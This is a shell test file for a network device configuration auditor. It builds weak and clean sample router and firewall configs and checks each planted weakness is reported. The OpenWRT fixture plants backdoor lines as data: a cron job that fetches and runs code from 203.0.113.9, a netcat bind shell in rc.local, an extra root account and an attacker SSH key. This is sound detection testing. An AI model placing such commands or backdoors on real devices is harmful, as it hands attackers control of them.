#!/bin/sh
# Tests for roles/network/NW-07-config-audit.sh.
# For every vendor: a "bad" sample config with planted weaknesses (each must
# be found) and a "clean" one (it must give no HIGH or MED finding).  Also:
# vendor recognition from the text, reading NW-01's store, secret masking.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/network/NW-07-config-audit.sh"
export BT_SKIP_VERIFY=1
# shellcheck disable=SC2086
run() { $SH "$C" "$@"; }
O="$T_TMP/out"; F="$T_TMP/cfg"; mkdir -p "$O" "$F"

cat >"$F/r1-bad.cfg" <<'CFG'
version 15.2
hostname r1
enable password cisco123
username cisco privilege 15 password 0 cisco
username ops privilege 15 secret 9 $9$abc
no service password-encryption
ip http server
snmp-server community public RO
snmp-server community wr1te RW
line con 0
 no login
line vty 0 4
 password 7 0822455D0A16
 transport input telnet ssh
end
CFG
cat >"$F/r2-clean.cfg" <<'CFG'
version 17.3
service password-encryption
hostname r2
enable secret 9 $9$xyz
username netops privilege 15 secret 9 $9$def
ip ssh version 2
logging host 10.0.0.50
line con 0
 login local
line vty 0 4
 access-class MGMT in
 login local
 transport input ssh
end
CFG
cat >"$F/asa-bad.cfg" <<'CFG'
ASA Version 9.8(4)
hostname asa1
enable password plainpass
username admin password Passw0rd privilege 15
telnet 0.0.0.0 0.0.0.0 inside
http 0.0.0.0 0.0.0.0 outside
ssh 0.0.0.0 0.0.0.0 outside
snmp-server community private
access-list OUTSIDE_IN extended permit ip any any
: end
CFG
cat >"$F/asa-clean.cfg" <<'CFG'
ASA Version 9.16(1)
hostname asa2
enable password $sha512$5000$abc pbkdf2
username netops password $sha512$5000$def pbkdf2 privilege 15
ssh 10.0.0.0 255.255.255.0 inside
http 10.0.0.0 255.255.255.0 inside
logging host inside 10.0.0.50
access-list OUTSIDE_IN extended permit tcp any host 10.0.2.5 eq www
: end
CFG
cat >"$F/pa-bad.cfg" <<'CFG'
config {
  mgt-config {
    users {
      admin {
        phash $1$abc;
      }
      backdoor {
        phash $1$def;
      }
    }
  }
  devices {
    localhost.localdomain {
      deviceconfig {
        system {
          service {
            disable-telnet no;
            disable-http no;
          }
          snmp-setting {
            access-setting {
              version {
                v2c {
                  snmp-community-string public;
                  community-string public;
                }
              }
            }
          }
        }
      }
      vsys {
        vsys1 {
          rulebase {
            security {
              rules {
                "allow-everything" {
                  from any;
                  to any;
                  source any;
                  destination any;
                  application any;
                  service any;
                  action allow;
                }
                web-in {
                  from untrust;
                  to dmz;
                  source any;
                  destination [ 10.0.2.5 ];
                  application web-browsing;
                  service application-default;
                  action allow;
                }
              }
            }
          }
        }
      }
    }
  }
}
CFG
cat >"$F/pa-clean.cfg" <<'CFG'
config {
  mgt-config {
    users {
      netops {
        phash $5$abc;
      }
    }
  }
  devices {
    localhost.localdomain {
      deviceconfig {
        system {
          permitted-ip {
            10.0.0.0/24;
          }
          service {
            disable-telnet yes;
            disable-http yes;
          }
        }
      }
    }
  }
}
CFG
cat >"$F/fg-bad.cfg" <<'CFG'
#config-version=FG60F-7.2.5
config system interface
    edit "wan1"
        set allowaccess ping https ssh http telnet
    next
end
config system admin
    edit "admin"
        set accprofile "super_admin"
    next
end
config system snmp community
    edit 1
        set name "public"
    next
end
config firewall policy
    edit 1
        set srcaddr "all"
        set dstaddr "all"
        set action accept
        set service "ALL"
    next
end
CFG
cat >"$F/fg-clean.cfg" <<'CFG'
#config-version=FG60F-7.2.5
config system interface
    edit "internal"
        set allowaccess ping https ssh
    next
end
config system admin
    edit "netops"
        set trusthost1 10.0.0.0 255.255.255.0
    next
end
CFG
printf "set system host-name 'vyos1'\nset service telnet\nset service snmp community 'public' authorization 'ro'\nset system login user vyos authentication plaintext-password 'vyos'\nset service ssh port '22'\n" >"$F/vyos-bad.cfg"
printf "set system host-name 'vyos2'\nset service ssh listen-address '10.0.0.1'\nset service ssh port '22'\nset system login user netops authentication encrypted-password 'x'\n" >"$F/vyos-clean.cfg"
cat >"$F/pf-bad.cfg" <<'CFG'
<?xml version="1.0"?>
<pfsense>
<system><user><name>admin</name></user>
<webgui><protocol>http</protocol></webgui></system>
<snmpd><rocommunity>public</rocommunity></snmpd>
<filter><rule><type>pass</type><interface>wan</interface><source><any/></source><destination><any/></destination></rule></filter>
</pfsense>
CFG
printf '<?xml version="1.0"?>\n<pfsense>\n<system><webgui><protocol>https</protocol></webgui></system>\n<filter><rule><type>pass</type><interface>lan</interface><source><any/></source><destination><any/></destination></rule></filter>\n</pfsense>\n' >"$F/pf-clean.cfg"
printf '# nov/11/2026 10:00:00 by RouterOS 6.49\n/ip service\nset www disabled=no\n/snmp community\nset [ find default=yes ] name=public\n/user\nadd name=backdoor group=full\n' >"$F/mt-bad.cfg"
# (the export wraps long lines with a backslash: the www line's disabled=yes is on the second half)
printf '# nov/11/2026 10:00:00 by RouterOS 6.49\n/ip service\nset telnet disabled=yes\nset www address=10.0.0.0/24,10.0.1.0/24 \\\n    disabled=yes\nset ftp disabled=yes\nset api disabled=yes\n' >"$F/mt-clean.cfg"

t_start "options"
run --file "$T_TMP/none.cfg" >/dev/null 2>&1; t_eq "$?" 2 "missing file exits 2"
run --file "$F/r1-bad.cfg,junos" >/dev/null 2>&1; t_eq "$?" 2 "unknown vendor exits 2"
run --out "$T_TMP/empty" >/dev/null 2>&1; t_eq "$?" 3 "no saved configs exits 3"

t_start "bad configs: every planted weakness found"
set --
for f in r1-bad asa-bad pa-bad fg-bad vyos-bad pf-bad mt-bad; do set -- "$@" --file "$F/$f.cfg"; done
out=$(run --out "$O" "$@" 2>&1); rc=$?
t_eq "$rc" 0 "exit 0"
d=$(printf '%s\n' "$out" | sed -n 's/^All results: //p')
x=$(t_quoted "$d/findings.txt")
t_has "$x" '"r1-bad","cisco-ios"' "Cisco IOS recognised from the text"
t_has "$x" '"pa-bad","paloalto"' "Palo Alto recognised from the text"
t_has "$x" '"HIGH","telnet allowed on remote login lines"' "IOS: telnet on VTY"
t_has "$x" '"HIGH","login with NO password on line con 0"' "IOS: no login on console"
t_has "$x" '"MED","remote login lines accept any address (no access-class)"' "IOS: no access-class"
t_has "$x" '"HIGH","enable password stored weakly' "IOS: enable password"
t_has "$x" '"HIGH","account cisco has a clear-text or reversible password"' "IOS: clear-text user password"
t_has "$x" '"MED","default-looking account name cisco"' "IOS: default account name"
t_has "$x" '"HIGH","default/guessable SNMP community","snmp-server community **** RO"' "IOS: public community, masked"
t_has "$x" '"HIGH","SNMP read-WRITE community' "IOS: RW community"
t_has "$x" '"MED","plain HTTP management server on"' "IOS: http server"
t_has "$x" '"MED","reversible line password (type 7)"' "IOS: type 7"
t_has "$x" '"HIGH","telnet management open to ANY address on inside"' "ASA: telnet"
t_has "$x" '"HIGH","web management (ASDM) open to ANY address on outside"' "ASA: http any"
t_has "$x" '"HIGH","access list permits ANY to ANY"' "ASA: permit ip any any"
t_has "$x" '"HIGH","account admin password not hashed"' "ASA: unhashed password"
t_has "$x" '"HIGH","telnet management on"' "Palo Alto: telnet"
t_has "$x" '"HIGH","security rule allow-everything allows ANY source' "Palo Alto: any-any rule"
t_hasnt "$x" 'web-in' "Palo Alto: a specific allow rule is not flagged"
t_has "$x" '"MED","the default admin account exists' "Palo Alto: default admin"
t_has "$x" '"MED","management interface accepts any address (no permitted-ip)"' "Palo Alto: no permitted-ip"
t_has "$x" '"HIGH","telnet management on interface wan1"' "FortiGate: telnet on wan1"
t_has "$x" '"HIGH","firewall policy 1 accepts ALL to ALL' "FortiGate: all-all policy"
t_has "$x" '"MED","admin admin can log in from any address (no trusthost)"' "FortiGate: no trusthost"
t_has "$x" '"HIGH","telnet service on","set service telnet"' "VyOS: telnet"
t_has "$x" '"HIGH","clear-text login password in the config"' "VyOS: plaintext password"
t_has "$x" '"HIGH","rule passes ANY to ANY on the WAN interface"' "pfSense: WAN any-any"
t_has "$x" '"MED","web GUI over plain HTTP"' "pfSense: http GUI"
t_has "$x" '"MED","telnet not disabled in the export' "MikroTik: telnet default"
t_has "$x" '"MED","plain HTTP management (www) on"' "MikroTik: www"
t_hasnt "$x" "cisco123" "secrets masked"
t_fail "no CSV files in the run" sh -c "ls '$d' | grep -q csv"
t_eq "$(sed -n 2p "$d/flags.txt" | cut -d'|' -f1 | tr -d ' ')" HIGH "flags.txt: HIGH first"
t_hasnt "$x" "Passw0rd" "secrets masked (ASA)"

t_start "clean configs: no HIGH or MED"
set --
for f in r2-clean asa-clean pa-clean fg-clean vyos-clean pf-clean mt-clean; do set -- "$@" --file "$F/$f.cfg"; done
out=$(run --out "$O" "$@" 2>&1)
d=$(printf '%s\n' "$out" | sed -n 's/^All results: //p')
x=$(t_quoted "$d/findings.txt")
t_hasnt "$x" '"HIGH"' "no HIGH finding on clean configs"
t_hasnt "$x" '"MED"' "no MED finding on clean configs"
[ -n "${T_DEBUG:-}" ] && printf '%s\n' "$x" | grep '"MED"' >&2
t_has "$x" '"r2-clean","cisco-ios","INFO","local accounts","netops"' "accounts still listed"

t_start "reads NW-01's store"
S="$O/net-configs"; mkdir -p "$S/edge1" "$S/srv1"
cp "$F/r1-bad.cfg" "$S/edge1/20261111T100000Z.norm"; echo 20261111T100000Z >"$S/edge1/latest"; echo cisco-ios >"$S/edge1/vendor"
echo "x" >"$S/srv1/20261111T100000Z.norm"; echo 20261111T100000Z >"$S/srv1/latest"; echo linux >"$S/srv1/vendor"
out=$(run --out "$O" 2>&1)
t_has "$out" "edge1" "device from the store audited"
t_hasnt "$out" "srv1 " "linux device skipped (the Linux scripts cover it)"
t_start "OpenWRT"
# A router as NW-01 saves it: problems planted, then a clean one.
cat >"$T_TMP/owrt-bad.cfg" <<'CFG'
===release
DISTRIB_ID='OpenWrt'
===uci
package dropbear

config dropbear
	option PasswordAuth 'on'
	option Port '22'

package uhttpd

config uhttpd 'main'
	list listen_http '0.0.0.0:80'
	list listen_https '0.0.0.0:443'
	option redirect_https '0'

package firewall

config zone
	option name 'wan'
	option input 'ACCEPT'
	option forward 'REJECT'

config forwarding
	option src 'wan'
	option dest 'lan'

config rule
	option name 'ssh-in'
	option src 'wan'
	option dest_port '22'
	option target 'ACCEPT'

config redirect
	option name 'web'
	option src 'wan'
	option src_dport '80'
	option dest_ip '192.168.220.10'
	option dest_port '80'
	option target 'DNAT'

config redirect
	option name 'rdp'
	option src 'wan'
	option src_dport '3389'
	option dest_ip '192.168.220.79'
	option target 'DNAT'

package upnpd

config upnpd 'config'
	option enabled '1'

package snmpd

config community
	option community 'public'

package system

config system
	option hostname 'router'

package wireless

config wifi-iface 'x'
	option key 'Sup3rS3cretWifi'
===passwd
root:x:0:0:root:/root:/bin/ash
toor:x:0:0:toor:/root:/bin/ash
===keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl evil@kali
===cron
*/5 * * * * wget -qO- http://203.0.113.9/x | sh
===startup
S50telnet
===rc.local
nc -lp 4444 -e /bin/ash &
exit 0
CFG
out=$($SH "$C" --out "$O" --no-color --file "$T_TMP/owrt-bad.cfg" 2>&1)
t_has "$out" "[!] owrt-bad (openwrt): " "the vendor is recognised and the device line shows HIGH"
for x in "the outside (wan) zone ACCEPTs everything sent to the router" "outside to inside forwarding" \
         "router management open from the outside (port 22)" "UPnP is on" "default/guessable SNMP community" \
         "SSH (dropbear) listens on every interface" "web admin (LuCI) over plain HTTP" "a second account with root rights (UID 0)" \
         "SSH key(s) can log in as root" "root cron job on the router" "telnet starts at boot" "a command in /etc/rc.local" \
         "a management or database port is forwarded from the outside" "no remote log server"; do
    t_has "$out$(cat "$(printf '%s\n' "$out" | sed -n 's/^All results: //p' | tail -n 1)/findings.txt")" "$x" "found: $x"
done
f=$(cat "$(printf '%s\n' "$out" | sed -n 's/^All results: //p' | tail -n 1)/findings.txt")
t_has "$f" "80 -> 192.168.220.10:80" "port forwards are listed (the scored paths)"
t_hasnt "$out$f" "Sup3rS3cretWifi" "the Wi-Fi key is never shown"
cat >"$T_TMP/owrt-ok.cfg" <<'CFG'
===uci
package dropbear

config dropbear
	option PasswordAuth 'on'
	option Interface 'lan'

package uhttpd

config uhttpd 'main'
	list listen_https '192.168.220.2:443'
	option redirect_https '1'

package firewall

config zone
	option name 'wan'
	option input 'REJECT'
	option forward 'REJECT'

config redirect
	option name 'web'
	option src 'wan'
	option src_dport '80'
	option dest_ip '192.168.220.10'
	option target 'DNAT'

package system

config system
	option log_ip '192.168.220.30'
===passwd
root:x:0:0:root:/root:/bin/ash
===keys
===cron
===startup
S50dropbear
CFG
out=$($SH "$C" --out "$O" --no-color --file "$T_TMP/owrt-ok.cfg,openwrt" 2>&1)
t_has "$out" "[ok] owrt-ok (openwrt): nothing found" "a clean router: nothing found"
t_hasnt "$out" "[!] owrt-ok" "no HIGH"

t_start "questions"
if command -v script >/dev/null 2>&1; then
    printf 'ROOT stuff\n' >"$T_TMP/plain.cfg"
    # no saved configs: asked for a file, then what device it is (o = OpenWRT)
    printf '%s\no\n' "$T_TMP/owrt-ok.cfg" >"$T_TMP/ans"
    tt=$(BT_NO_TTY=0 script -qc "$SH '$C' --out '$T_TMP/out2' --no-color" /dev/null <"$T_TMP/ans" 2>&1)
    t_has "$tt" "Config file to audit?" "with nothing saved it asks for a file"
    t_has "$tt" "owrt-ok (openwrt)" "and audits it"
fi
t_done
